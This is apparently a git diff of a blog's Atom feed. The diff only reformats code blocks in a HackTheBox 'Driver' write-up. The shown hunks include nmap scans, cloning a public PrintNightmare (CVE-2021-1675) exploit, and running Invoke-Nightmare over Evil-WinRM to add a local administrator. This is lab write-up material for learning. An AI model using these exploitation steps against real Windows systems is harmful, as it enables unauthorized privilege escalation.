@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/tag/hackthebox/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2022-08-20T23:33:18+00:00</updated>
+  <updated>2022-08-21T10:52:11+00:00</updated>
   <id>https://darrynbrownfield.co.uk/tag/hackthebox/feed.xml</id>
 
   
@@ -47,20 +47,20 @@
 
 &lt;p&gt;I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan to check the available ports.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/initial 10.10.11.106
-Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-27 17:20 GMT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.106
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.020s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.11.106
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:20 GMT
+Nmap scan report for 10.10.11.106
+Host is up (0.020s latency).
 Not shown: 997 filtered ports
 PORT    STATE SERVICE      VERSION
 80/tcp  open  http         Microsoft IIS httpd 10.0
 | http-auth: 
-| HTTP/1.1 401 Unauthorized&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D
-|_  Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MFP Firmware Update Center. Please enter password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;admin
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
 | http-methods: 
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
-|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=UTF-8).
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
 135/tcp open  msrpc        Microsoft Windows RPC
 445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
 Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
@@ -80,7 +80,8 @@ Host script results:
 |_  start_date: 2022-02-27T04:55:51
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;3 Ports open:&lt;/p&gt;
 
@@ -92,16 +93,17 @@ Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds&lt;/span&gt;&lt;/co
 
 &lt;p&gt;I also ran a full port scan and found winrm to be open on port 5985.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; nmap -p- -oA nmap/all_ports 10.10.11.106
-Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-27 17:25 GMT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.106
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.026s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p- -oA nmap/all_ports 10.10.11.106
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:25 GMT
+Nmap scan report for 10.10.11.106
+Host is up (0.026s latency).
 Not shown: 65531 filtered ports
 PORT     STATE SERVICE
 80/tcp   open  http
 135/tcp  open  msrpc
 445/tcp  open  microsoft-ds
-5985/tcp open  wsman&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+5985/tcp open  wsman
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;The web service is showing an unauthorized response however it could be leaking a username with the message “Please enter password for admin”.&lt;/p&gt;
 
@@ -192,38 +194,40 @@ Protocol: [MS-RPRN]: Print System Remote Protocol
 
 &lt;p&gt;I used git to clone the repo in to my /opt directory.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; git clone https://github.com/calebstewart/CVE-2021-1675.git
-Cloning into &lt;span class=&quot;s1&quot;&gt;'CVE-2021-1675'&lt;/span&gt;...
-remote: Enumerating objects: 40, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;40/40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;32/32&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Total 40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 37 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 0
-Receiving objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;40/40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 131.12 KiB | 932.00 KiB/s, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Resolving deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9/9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo git clone https://github.com/calebstewart/CVE-2021-1675.git
+Cloning into 'CVE-2021-1675'...
+remote: Enumerating objects: 40, done.
+remote: Counting objects: 100% (40/40), done.
+remote: Compressing objects: 100% (32/32), done.
+remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0
+Receiving objects: 100% (40/40), 131.12 KiB | 932.00 KiB/s, done.
+Resolving deltas: 100% (9/9), done.
 ┌─[daz@parrotos]─[/opt]
-└──╼ &lt;span class=&quot;nv&quot;&gt;$cd&lt;/span&gt; CVE-2021-1675
+└──╼ $cd CVE-2021-1675
 ┌─[daz@parrotos]─[/opt/CVE-2021-1675]
-└──╼ &lt;span class=&quot;nv&quot;&gt;$ls&lt;/span&gt;
-CVE-2021-1675.ps1  nightmare-dll  README.md&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+└──╼ $ls
+CVE-2021-1675.ps1  nightmare-dll  README.md
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Now using Evil-WinRM I can upload the powershell script and execute it.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\tony\Documents&amp;gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
 Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1
 
                                                              
-&lt;span class=&quot;k&quot;&gt;Data&lt;/span&gt;: 238080 bytes of 238080 bytes copied
+Data: 238080 bytes of 238080 bytes copied
 
 Info: Upload successful!
 
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\tony\Documents&amp;gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;PS &lt;/span&gt;C:\Users\tony\Documents&amp;gt; Invoke-Nightmare
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] &lt;span class=&quot;k&quot;&gt;using &lt;/span&gt;default new user: adm1n
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] &lt;span class=&quot;k&quot;&gt;using &lt;/span&gt;default new password: P@ssw0rd
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] &lt;span class=&quot;k&quot;&gt;using &lt;/span&gt;pDriverPath &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&quot;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] added user  as &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;administrator
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] deleting payload &lt;span class=&quot;k&quot;&gt;from &lt;/span&gt;C:\Users\tony\AppData\Local\Temp\nightmare.dll&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
+*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; Invoke-Nightmare
+[+] using default new user: adm1n
+[+] using default new password: P@ssw0rd
+[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = &quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&quot;
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;It worked! I canceled my current WinRM session and logged back in using the new credentials.&lt;/p&gt;
 
